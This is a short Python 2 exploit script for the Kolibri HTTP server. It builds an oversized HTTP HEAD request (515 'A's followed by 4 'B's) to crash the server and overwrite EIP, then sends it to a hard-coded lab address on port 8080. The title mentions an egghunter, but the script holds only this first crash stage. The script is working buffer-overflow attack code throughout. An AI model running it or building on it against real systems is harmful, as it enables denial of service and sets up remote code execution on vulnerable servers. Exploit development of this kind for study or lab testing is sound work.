#!/usr/bin/python

import socket
import os
import sys

banner = """
#----------------------------------------------#
Kolibri HTTP Server Exploit - Egghunter
#----------------------------------------------#
"""

print banner

#crash the application and EIP with B's
Stage1 = "A"*515 + "B"*4

buffer = (
"HEAD /" + Stage1 + " HTTP/1.1\r\n"
"Host: 192.168.37.131:8080\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")
 
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.37.140", 8080))
expl.send(buffer)
expl.close()
